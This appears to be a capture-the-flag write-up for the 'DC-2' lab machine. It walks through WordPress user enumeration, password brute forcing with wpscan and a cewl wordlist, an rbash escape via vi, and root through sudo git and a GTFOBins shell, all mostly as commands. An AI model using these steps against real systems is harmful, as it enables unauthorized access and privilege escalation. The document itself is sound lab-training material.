# DC - 2

nmap enumeration

![](../.gitbook/assets/1111111111111111%20%2815%29.png)

finding webapp directories

![](../.gitbook/assets/1111111111111111%20%2818%29.png)

the output indicates that we have wp-admin directory so this is a wordpress CMS

add dc-2 to /etc/hosts of your kali machine to browse the webapp 

![](../.gitbook/assets/1111111111111111%20%287%29.png)

check out all pages for anything useful

![](../.gitbook/assets/1111111111111111%20%284%29.png)

create a wordlist using cewl command:

```text
cewl -m 4 -e -w wordlist http://dc-2
```

enumerate usernames with wpscan:

```text
wpscan --url http://dc-2  --enumerate u --force --wp-content-dir wp-content 
```

![](../.gitbook/assets/1111111111111111%20%285%29.png)

userlist:

```text
admin
tom
jerry
```

now lets brute force these acounts with the wordlist

```text
wpscan --url http://dc-2 --passwords wordlist  --usernames userlist -t 25
```

![](../.gitbook/assets/1111111111111111.png)

jerry : adipiscing

 tom : parturient

lets try ssh \( port 7744\)



![](../.gitbook/assets/1111111111111111%20%2813%29.png)

we have an rbash we need to escape from it

echo $path

![](../.gitbook/assets/1111111111111111%20%289%29.png)

we have less, ls, scp and vi

we can escape the shell through vi command:

```text
vi
:set shell=/bin/bash
:shell
```

```text
less flag3.txt
```

![](../.gitbook/assets/1111111111111111%20%2810%29.png)

so we need to su to jerry

su is not available for us so we should fix the $PATH variable

fix the path problem

```text
export PATH=/bin:/usr/bin:$PATH
```

su jerry

![](../.gitbook/assets/1111111111111111%20%2811%29.png)

now we need r00t:

![](../.gitbook/assets/1111111111111111%20%2817%29.png)

we can sudo git without password

use gtfobins instructions for this privesc method:

```text
sudo git -p help config
!/bin/sh
```

![](../.gitbook/assets/1111111111111111%20%283%29.png)

done !













